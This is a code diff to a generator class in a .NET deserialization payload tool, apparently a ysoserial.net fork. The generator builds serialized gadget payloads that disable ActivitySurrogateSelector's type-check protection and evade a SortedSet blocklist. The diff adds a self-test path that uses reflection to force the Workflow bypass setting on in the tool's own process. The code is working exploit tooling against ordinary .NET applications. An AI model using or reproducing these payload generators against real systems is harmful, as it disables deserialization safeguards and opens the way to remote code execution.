@@ -1,11 +1,20 @@
 ﻿using NDesk.Options;
+using System;
 using System.Collections.Generic;
+using System.Configuration;
+using System.Reflection;
 using ysonet.Helpers;
 
 namespace ysonet.Generators
 {
     public class ActivitySurrogateDisableTypeCheckGenerator : GenericGenerator
     {
+        private const string WorkflowSetting =
+            "microsoft:WorkflowComponentModel:DisableActivitySurrogateSelectorTypeCheck";
+        private const string WorkflowAppSettings =
+            "System.Workflow.ComponentModel.AppSettings, System.Workflow.ComponentModel, "
+            + "Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35";
+
         // Discovery facets (category search only): does not run a user command; it
         // flips a config flag to disable ActivitySurrogateSelector's type check. That
         // known result fits no broad family, so kind is "other". Uses WPF and
@@ -32,7 +41,7 @@ namespace ysonet.Generators
             return "Disables 4.8+ type protections for ActivitySurrogateSelector, command is ignored. "
                 + "Variant 1 also takes rootcontainer (1 SortedSet, 2 SortedDictionary, 3 TreeSet) "
                 + "to dodge a SortedSet wire-name blocklist; SoapFormatter supports roots 1 and 3. "
-                + "It self-tests in a child process.";
+                + "Variant 1 self-tests in a child, then keeps the setting enabled in this session.";
         }
 
         public override CommandInputType CommandInput()
@@ -159,20 +168,74 @@ xmlns:r=""clr-namespace:System.Reflection;assembly=mscorlib"">
                 xaml_payload = XmlMinifier.Minify(xaml_payload, null, null);
             }
 
+            object payload;
             if (variant_number == 2)
             {
-                return Serialize(new TextFormattingRunPropertiesMarshal(xaml_payload),
+                payload = Serialize(new TextFormattingRunPropertiesMarshal(xaml_payload),
                     formatter, inputArgs);
             }
-            if (formatter.Equals(Formatters.SoapFormatter,
+            else if (formatter.Equals(Formatters.SoapFormatter,
                 System.StringComparison.OrdinalIgnoreCase))
             {
-                return TypeConfuseDelegateGenerator.SerializeSoapXamlGadget(
+                payload = TypeConfuseDelegateGenerator.SerializeSoapXamlGadget(
                     xaml_payload, root_container_number, inputArgs);
             }
+            else
+            {
+                payload = Serialize(TypeConfuseDelegateGenerator.GetXamlGadget(
+                    xaml_payload, root_container_number), formatter, inputArgs);
+            }
 
-            return Serialize(TypeConfuseDelegateGenerator.GetXamlGadget(
-                xaml_payload, root_container_number), formatter, inputArgs);
+            // Variant 1 has to test its exact payload in a child because that graph
+            // fail-fasts after the XAML has fired. The child cannot retain a static field
+            // for the interactive parent, so mirror the payload's two assignments here
+            // after the child test returns. This is deliberately test-only: ordinary
+            // generation must not alter ysonet's own Workflow policy.
+            if (inputArgs != null && inputArgs.Test && variant_number == 1)
+            {
+                EnableForFollowOnSelfTests();
+                Console.Error.WriteLine("[self-test] Workflow's type-check setting is now "
+                    + "enabled in this ysonet process for follow-on local tests.");
+            }
+
+            return payload;
+        }
+
+        private static void EnableForFollowOnSelfTests()
+        {
+            try
+            {
+                // Set the configuration value first. If Workflow has not loaded its
+                // one-time settings cache yet, its effective property will read true.
+                ConfigurationManager.AppSettings.Set(WorkflowSetting, "true");
+
+                Type appSettings = Type.GetType(WorkflowAppSettings, true);
+                FieldInfo field = appSettings.GetField(
+                    "disableActivitySurrogateSelectorTypeCheck",
+                    BindingFlags.Static | BindingFlags.NonPublic);
+                if (field == null || field.FieldType != typeof(bool))
+                    throw new MissingFieldException(appSettings.FullName,
+                        "disableActivitySurrogateSelectorTypeCheck");
+                field.SetValue(null, true);
+
+                // Verify the value Workflow itself will consume. This also catches its
+                // dynamic-code policy gate rather than claiming the process is armed when
+                // only the raw backing field changed.
+                PropertyInfo effective = appSettings.GetProperty(
+                    "DisableActivitySurrogateSelectorTypeCheck",
+                    BindingFlags.Static | BindingFlags.NonPublic);
+                if (effective == null || effective.PropertyType != typeof(bool)
+                    || !(bool)effective.GetValue(null, null))
+                    throw new InvalidOperationException(
+                        "Workflow still reports the effective setting as false.");
+            }
+            catch (Exception ex)
+            {
+                throw new InvalidOperationException(
+                    "The variant 1 payload was tested in its safety child, but ysonet "
+                    + "could not retain the Workflow setting for follow-on local tests: "
+                    + ex.Message, ex);
+            }
         }
 
     }
